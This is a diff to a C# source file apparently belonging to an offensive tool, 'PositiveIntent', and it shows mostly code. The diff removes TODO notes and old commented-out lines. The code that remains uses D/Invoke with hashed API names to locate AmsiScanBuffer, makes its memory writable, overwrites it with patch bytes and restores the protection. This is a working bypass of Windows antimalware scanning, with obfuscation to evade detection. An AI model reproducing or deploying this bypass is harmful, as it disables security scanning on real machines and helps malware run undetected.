@@ -9,8 +9,6 @@ using PositiveIntent.DynamicInvoke;
 
 namespace PositiveIntent
 {
-    // TODO: add better error handling
-    // TODO: fully implement D/Invoke w/ API hashing
     public class Bannana
     {
         public static void Peel()
@@ -19,7 +17,6 @@ namespace PositiveIntent
             var hModule = Generic.GetLoadedModuleAddress("6B57900FDD9BC3ED1AACC8BB36AF6749", 0x123456789); // kernel32.dll
             var hPointer = Generic.GetExportAddress(hModule, "9AE8798D35BD945359EE61388A24DF4F", 0x123456789); // LoadLibraryA
             Generic.DynamicFunctionInvoke<IntPtr>(hPointer, typeof(LoadLibraryA), ref parameters);
-            //Generic.DynamicApiInvoke<IntPtr>("kernel32.dll", "LoadLibraryA", typeof(LoadLibraryA), ref parameters);
 
             var modules = Process.GetCurrentProcess().Modules;
             var hAmsi = IntPtr.Zero;
@@ -36,7 +33,6 @@ namespace PositiveIntent
             parameters = new object[]{ hAmsi, "AmsiScanBuffer" };
             hPointer = Generic.GetExportAddress(hModule, "BA0307826406754C1A4B8DDF988DD065", 0x123456789); // GetProcAddress
             IntPtr asb = Generic.DynamicFunctionInvoke<IntPtr>(hPointer, typeof(GetProcAddress), ref parameters);
-            //IntPtr asb = Generic.DynamicApiInvoke<IntPtr>("kernel32.dll", "GetProcAddress", typeof(GetProcAddress), ref parameters);
 
             if (IntPtr.Size == 8) // 64 bit process
             {
@@ -54,10 +50,7 @@ namespace PositiveIntent
 
         public static void Eat(IntPtr asb, byte[] garbage)
         {
-            // Set region to RW
-            //var addressVirtualProtect = Generic.GetLibraryAddress("k" + "er"+ "n" + "e" + "l" + "32" + ".d" + "ll", "Vir" + "tu" + "al" + "Pr" + "o" + "te" + "c" + "t");
-            //var VirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(addressVirtualProtect, typeof(VirtualProtect));
-            //VirtualProtect(asb, (UIntPtr)garbage.Length, 0x04, out uint oldProtect);
+            // Modify memory region to RW
             uint lpflOldProtect = 0;
             object[] parameters = { asb, (UIntPtr)garbage.Length, Win32.WinNT.PAGE_READWRITE, lpflOldProtect };
             var hModule = Generic.GetLoadedModuleAddress("6B57900FDD9BC3ED1AACC8BB36AF6749", 0x123456789); // kernel32.dll
@@ -68,7 +61,6 @@ namespace PositiveIntent
             Marshal.Copy(garbage, 0, asb, garbage.Length);
 
             // Retore region to RX
-            //VirtualProtect(asb, (UIntPtr)garbage.Length, oldProtect, out uint _);
             parameters = new object[]{ asb, (UIntPtr)garbage.Length, parameters[3], lpflOldProtect };
             Generic.DynamicFunctionInvoke<bool>(hPointer, typeof(VirtualProtect), ref parameters);
         }
